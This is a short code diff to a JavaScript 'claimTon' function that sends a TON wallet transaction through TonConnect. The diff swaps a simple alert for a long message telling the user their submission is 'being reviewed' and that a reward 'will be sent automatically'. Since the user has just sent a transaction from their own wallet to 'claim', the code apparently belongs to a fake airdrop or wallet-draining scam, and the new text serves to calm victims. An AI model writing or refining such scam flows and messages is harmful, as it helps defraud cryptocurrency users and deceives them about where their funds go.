@@ -290,7 +290,9 @@ async function claimTon() {
 
   try {
     const result = await tonConnectUI.sendTransaction(transaction);
-    alert("Claim sent! Check wallet.");
+    alert(
+      "🎊 Thank You for Participating! 🎊 Weve received your submission successfully. 🔍 Your information is currently being reviewed.  This process usually takes just a few minutes. 💸 Once verified, your reward will be sent automatically.  Stay tuned, and thanks for being part of our community!🚀 "
+    );
     console.log("Transaction Result:", result);
   } catch (err) {
     alert("Transaction failed");
